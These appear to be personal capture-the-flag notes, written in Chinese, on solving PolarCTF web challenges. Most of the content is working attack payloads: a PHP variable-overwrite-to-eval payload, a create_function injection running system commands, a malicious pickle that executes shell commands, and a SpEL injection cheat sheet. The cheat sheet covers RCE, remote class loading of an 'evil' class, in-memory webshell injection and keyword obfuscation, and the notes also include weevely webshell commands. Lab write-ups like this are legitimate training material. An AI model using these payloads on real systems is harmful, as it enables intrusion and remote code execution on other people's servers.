# web
### swp
递归绕过正则限制
```python
import requests
data = {"xdmtql": "sys nb" + "aaaaa" * 1000000}
res = requests.post('http://d9d00980-d2fc-412e-b6cc-b6db2562eafb.www.polarctf.com:8090/index.php', data=data, allow_redirects=False)
print(res.content)

```

### 简单rce
$IFS空格绕过+sort读取文件

### 上传


### 非常好绕的命令执行

hex2bin转换
`http://1ae67e55-509c-49e4-9bf7-a04be9788ca5.www.polarctf.com:8090/?args1=hex2bin&args2='73797374656d'&args3='ls'`

### php是世界上最好的语言
变量覆盖
```php
<?php
//flag in $flag
highlight_file(__FILE__);
include("flag.php");
$c=$_POST['sys'];
$key1 = 0;
$key2 = 0;
if(isset($_GET['flag1']) || isset($_GET['flag2']) || isset($_POST['flag1']) || isset($_POST['flag2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($flag1 == '8gen1' && $flag2 == '8gen1') {
    if(isset($_POST['504_SYS.COM'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\?/", $c)){
         eval("$c");  

    }
}
}
?>
```

```http
http://www.xxx.com?_POST[flag1]=8gen1&_POST[flag2]=8gen1
post:sys=echo($flag);&504[SYS.COM=a
```

### \$\$
`$GLOBALS`全局变量
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231211154038.png)


### 某函数的复仇
create_function注入

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231211163836.png)

```php
$shaw('',$root);


root=}system('more /flag');/*
shaw=create_function
```


### veryphp
call_user_func
调用类的方法
`myans=qwq::oao`

### unpickle
#pickle 

```python
import requests
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        return (eval,("__import__('os').popen('cat /flag').read()",))


e = exp()
s = pickle.dumps(e)#将获取的对象序列化
user = base64.b64encode(s).decode()##将序列化的对象使用base64加密
print(user)#输出加密后的序列化对象
```

### upload tutu
使用`fastcoll`生成俩个hash值相同的文件,在`D:\CTF_Tools\fastcoll_v1.0.0.5.exe\fastcoll_v1.0.0.5.exe`

`fastcoll_v1.0.0.5.exe -p test.php -o test1.php test2.php`


### ezjava
Spel表达式注入
```java
//简单rce
new java.lang.ProcessBuilder("calc").start()
T(java.lang.Runtime).getRuntime().exec('calc')
new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);")

//远程类加载
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8888/')}).loadClass("evil").getConstructors()[0].newInstance()

new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8888/')}).loadClass("evil").newInstance()



//回显
new java.util.Scanner(new java.lang.ProcessBuilder("ls", "app").start().getInputStream(), "GBK").useDelimiter("asdasdasdasd").next()

new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()

//需要注册一个response上下文
#response.addHeader('x-cmd',new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine())


//内存🐎
T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.util.Base64Utils).decodeFromString(''),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()

//关键字绕过
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),newString[]{"cmd","/C","calc"})

''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod("ex"+"ec",T(String[])).invoke(''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod("getRu"+"ntime").invoke(null),'calc')
```


### 这又是一个上传
可以直接上传一个php,但是权限很低,什么也做不了

使用`weevely`,在`D:\CTF_Tools\weevely3\`
```bash
#生成shell
python3 weevely.py generate cmd shell.php
#连接shell
python3 weevely.py http://xxx.php cmd
```

### 你的马呢？
apache解析漏洞
> AddHandler导致的Apache解析漏洞
如果服务器给.php后缀添加了处理器：
AddHandler application/x-httpd-php.php
那么，在有多个后缀的情况下，只要包含.php后缀的文件就会被识别出php文件进行解析，不需要是最后一个后缀。如shell.php.jpg中包含.php，所以解析为php文件
利用：
1、1.php.jpg
2、1.php.txt
影响范围：2.4.0-2.4.29版本

---

### CB链
java反序列化CommonBean链


# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-12-09   23:22